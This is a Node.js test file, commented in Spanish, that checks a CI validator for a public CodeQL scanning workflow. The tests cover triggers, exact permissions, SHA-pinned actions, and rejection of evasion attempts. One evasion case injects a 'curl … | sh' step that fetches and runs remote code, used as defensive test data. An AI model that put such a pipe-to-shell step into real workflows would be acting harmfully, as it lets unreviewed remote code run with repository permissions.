'use strict';

/**
 * code-scanning-workflow.test.js — el workflow propio del análisis de código (CodeQL), que analiza también los pull
 * requests desde un fork.
 *
 * `.github/workflows/code-scanning.yml` corre en el repo PÚBLICO sobre código de cualquiera que mande un pedido, con un
 * permiso que `ci.yml` no tiene: subir resultados de análisis (`security-events: write`). Por eso se lee por texto con
 * `check-public-workflow.js --code-scanning`, con su forma exacta, como los otros workflows públicos:
 *   · T1 — el archivo real cumple, por la función y por la consola.
 *   · T2 — corre en `pull_request` (también al salir del borrador), en `merge_group` y en `push` a main, y en nada más;
 *          en un pedido en borrador el job no corre.
 *   · T3 — `pull_request_target` no aparece en ninguna parte.
 *   · T4 — los permisos son exactamente `contents: read`, `actions: read` y `security-events: write`, en un solo
 *          bloque arriba de todo; no lee secretos.
 *   · T5 — cada `uses:` va fijado por el sha completo, con el tag como comentario.
 *   · T6 — los mismos tres lenguajes que analizaba la configuración de fábrica, sin compilar, con su categoría.
 *   · T7 — los únicos workflows del repo público son cinco, y `.github/workflows/` no tiene otros.
 *   · T8 — las formas de evasión que ve la forma exacta, y el checkout sin la credencial guardada.
 *   · T9 — los workflows públicos que no son `ci.yml` piden la constancia del dueño al cambiar (el inventario de la base).
 *
 * Correr: node --test scripts/tests/code-scanning-workflow.test.js
 */

const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const { spawnSync } = require('child_process');

const ROOT = path.resolve(__dirname, '..', '..');
const YML = path.join(ROOT, '.github', 'workflows', 'code-scanning.yml');
const WF = require(path.join(ROOT, 'scripts', 'ci', 'check-public-workflow.js'));
const text = () => fs.readFileSync(YML, 'utf8');
const broken = (from, to) => {
  const t = text();
  assert.ok(t.includes(from), `el workflow trae «${from}» (la prueba lo altera)`);
  return WF.check(t.replace(from, to), { scanning: true }).map((b) => b.rule);
};

// 🔴 Falla con: el control sin el modo `--code-scanning`, o un workflow que no cumple su forma.
test('T1 CodeScanning_RealFile_Passes @story-8.331 @ac-5', () => {
  assert.deepStrictEqual(WF.check(text(), { scanning: true }), [], 'el workflow del análisis cumple su forma');
  const r = spawnSync(process.execPath, [path.join(ROOT, 'scripts', 'ci', 'check-public-workflow.js'), '--code-scanning', YML], { encoding: 'utf8' });
  assert.strictEqual(r.status, 0, r.stdout + r.stderr);
});

// 🔴 Falla con: un disparador de más o de menos, o el análisis corriendo en un pedido en borrador.
test('T2 CodeScanning_Triggers_PrQueuePush @story-8.331 @ac-1 @ac-2 @ac-4', () => {
  const t = text();
  assert.match(t, /^ {2}pull_request:\n {4}types: \[opened, synchronize, reopened, ready_for_review\]$/m);
  assert.match(t, /^ {2}push:\n {4}branches: \[main\]$/m);
  assert.match(t, /^ {2}merge_group:$/m);
  assert.ok(broken('  merge_group:\n', '').includes('scanning-trigger'), 'sin la cola: rojo');
  assert.ok(broken('  merge_group:\n', '  merge_group:\n  workflow_dispatch:\n').includes('scanning-trigger'), 'a mano: rojo');
  assert.ok(broken('    branches: [main]\n', "    branches: ['**']\n").includes('scanning-trigger'), 'un push a cualquier rama: rojo');
  assert.ok(broken('    if: github.event.pull_request.draft != true\n', '').includes('scanning-trigger'), 'sin la condición del borrador: rojo');
});

// 🔴 Falla con: el disparador que corre el código de afuera con los permisos del repo, aunque esté en un comentario.
test('T3 CodeScanning_NoPullRequestTarget @story-8.331 @ac-3 @ac-6', () => {
  assert.ok(!/pull_request_target/.test(text()));
  assert.ok(broken('  pull_request:\n', '  pull_request_target:\n').includes('pull-request-target'));
  assert.ok(broken('name: code-scanning\n', 'name: code-scanning\n# pull_request_target\n').includes('pull-request-target'), 'en un comentario: rojo');
});

// 🔴 Falla con: un permiso de más (escribir el repo), uno de menos (no sube resultados), o permisos por job.
test('T4 CodeScanning_Permissions_Exact @story-8.331 @ac-3 @ac-6', () => {
  assert.match(text(), /^permissions:\n {2}contents: read\n {2}actions: read\n {2}security-events: write\njobs:$/m);
  assert.ok(broken('  contents: read\n', '  contents: write\n').includes('scanning-permissions'), 'escribir el repo: rojo');
  assert.ok(broken('  security-events: write\n', '').includes('scanning-permissions'), 'sin subir resultados: rojo');
  assert.ok(broken('  security-events: write\n', '  security-events: write\n  pull-requests: write\n').includes('scanning-permissions'), 'un permiso de más: rojo');
  assert.ok(broken('    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    permissions:\n      contents: write\n').includes('scanning-permissions'), 'permisos por job: rojo');
  assert.ok(broken('          build-mode: none\n', '          build-mode: none\n          token: ${{ secrets.GITHUB_TOKEN }}\n').includes('secrets'), 'un secreto: rojo');
  // un comentario dentro del bloque no cambia los permisos: la regla no lo toma por un permiso
  assert.ok(!broken('  security-events: write\n', '  security-events: write\n  # el de subir resultados\n').includes('scanning-permissions'), 'un comentario: falso rojo');
});

// 🔴 Falla con: una acción fijada por un tag que alguien puede mover.
test('T5 CodeScanning_UsesBySha @story-8.331 @ac-3 @ac-6', () => {
  const usos = text().match(/^ {6}- uses: .+$/gm) || [];
  assert.strictEqual(usos.length, 3, usos.join('\n'));
  for (const u of usos) assert.match(u, /@[0-9a-f]{40} # v\d+\.\d+\.\d+$/, u);
  assert.ok(broken('/init@33d7b85da1a04171e211befe2c739303b9a4c066 # v4.39.3', '/init@v4').includes('uses-by-sha'));
});

// 🔴 Falla con: un lenguaje menos (se deja de analizar), compilar (otra forma de correr código de afuera) u otra categoría.
test('T6 CodeScanning_Languages_ThreeNoBuild @story-8.331 @ac-1 @ac-6', () => {
  assert.match(text(), /^ {8}language: \[actions, javascript-typescript, python\]$/m);
  assert.ok(broken('[actions, javascript-typescript, python]', '[actions, javascript-typescript]').includes('scanning-languages'), 'un lenguaje menos: rojo');
  assert.ok(broken('          build-mode: none\n', '          build-mode: autobuild\n').includes('scanning-languages'), 'compilar: rojo');
  assert.ok(broken('          category: /language:${{ matrix.language }}\n', '          category: otra\n').includes('scanning-languages'), 'otra categoría: rojo (las alertas dejan de ser las mismas)');
  // la palabra en un comentario no es compilar
  assert.ok(!broken('name: code-scanning\n', 'name: code-scanning\n# sin build manual\n').includes('scanning-languages'), 'un comentario: falso rojo');
});

// 🔴 Falla con: un workflow público que un pedido (o un fork) puede cambiar sin la constancia del dueño.
test('T9 Workflows_PublicOnesSignOnChange @story-8.331 @ac-11', () => {
  const inv = JSON.parse(fs.readFileSync(path.join(ROOT, 'scripts', 'ci', 'controls-from-base.json'), 'utf8'));
  const forma = (inv.controls || []).find((c) => c.name === 'workflow-shape');
  assert.ok(forma, 'el inventario de la base tiene el control workflow-shape');
  const firmados = (forma.rules || []).filter((r) => r && r.sign_on_change).map((r) => r.path).sort();
  const publicos = WF.WORKFLOWS.filter((w) => w !== 'ci.yml').map((w) => `.github/workflows/${w}`).sort();
  assert.deepStrictEqual(firmados, publicos, 'cada workflow público que no es ci.yml pide la constancia al cambiar');
});

// 🔴 Falla con: una forma de evasión que la regla con nombre no ve y la forma exacta sí, o la credencial del checkout guardada.
test('T8 CodeScanning_Shape_Evasions @story-8.331 @ac-5 @ac-6', () => {
  assert.ok(broken('        with:\n          persist-credentials: false\n', '').includes('scanning-checkout'), 'el checkout con la credencial guardada: rojo');
  const evasiones = [
    ['          category: /language:${{ matrix.language }}\n', '          category: /language:${{ matrix.language }}\n      - run: curl -s https://example.invalid | sh\n'],
    ['          build-mode: none\n', '          build-mode: none\n          config-file: ./.github/codeql.yml\n'],
    ['          build-mode: none\n', '          build-mode: none\n          queries: ./propias\n'],
    ['          build-mode: none\n', '          build-mode: none\n          packs: acme/pack\n'],
    ['    runs-on: ubuntu-latest\n', '    runs-on: ubuntu-latest\n    env:\n      CODEQL_EXTRACTOR_JAVASCRIPT_OPTION_SKIP_TYPES: "true"\n'],
    ['    if: github.event.pull_request.draft != true\n', "    if: github.event.pull_request.draft != true || github.actor != 'x'\n"],
    ['name: code-scanning\n', 'name: code-scanning\r# esconde una línea\n'],
    ['    timeout-minutes: 60\n', '\ttimeout-minutes: 60\n'],
  ];
  for (const [from, to] of evasiones) assert.ok(broken(from, to).includes('shape'), `no la frena la forma: ${JSON.stringify(to)}`);
  // una acción local, aunque la forma también la frene, la nombra su regla
  assert.ok(broken('      - uses: github/codeql-action/analyze@33d7b85da1a04171e211befe2c739303b9a4c066 # v4.39.3\n', '      - uses: ./acciones/analyze\n').includes('uses-by-sha'));
});

// 🔴 Falla con: un workflow que no está en la lista que controla `check-public-workflow.js`.
test('T7 Workflows_OnlyTheFive @story-8.331 @ac-5', () => {
  assert.deepStrictEqual([...WF.WORKFLOWS].sort(), ['ci.yml', 'code-scanning.yml', 'npm-publish.yml', 'site-image.yml', 'version-tag.yml']);
  const hay = fs.readdirSync(path.join(ROOT, '.github', 'workflows')).filter((f) => /\.ya?ml$/.test(f));
  assert.deepStrictEqual(hay.filter((f) => !WF.WORKFLOWS.includes(f)), [], 'un workflow fuera de la lista');
});

// 🔴 Falla con: el aviso de calidad nueva que se saca, que puede poner la CI en rojo, o que corre fuera de un pedido.
test('T10 CodeScanning_QualityWarning_NeverRed — el aviso de calidad nueva está, sólo en un pedido y sin frenar', () => {
  const t = text();
  assert.ok(t.includes('node scripts/ci/new-quality-findings.js --sarif'), 'el paso corre el aviso');
  for (const [de, a] of [
    ['        continue-on-error: true\n', ''],
    ["github.event_name == 'pull_request' && ", ''],
    ['--format=sarif-latest --output="${RUNNER_TEMP}/calidad.sarif" --threads=0 || true', '--format=sarif-latest --output="${RUNNER_TEMP}/calidad.sarif" --threads=0'],
  ]) {
    assert.ok(t.includes(de), `el archivo trae «${de.trim()}»`);
    const r = WF.check(t.replace(de, a), { scanning: true });
    assert.ok(r.length > 0, `sin «${de.trim()}» el control lo frena`);
  }
});
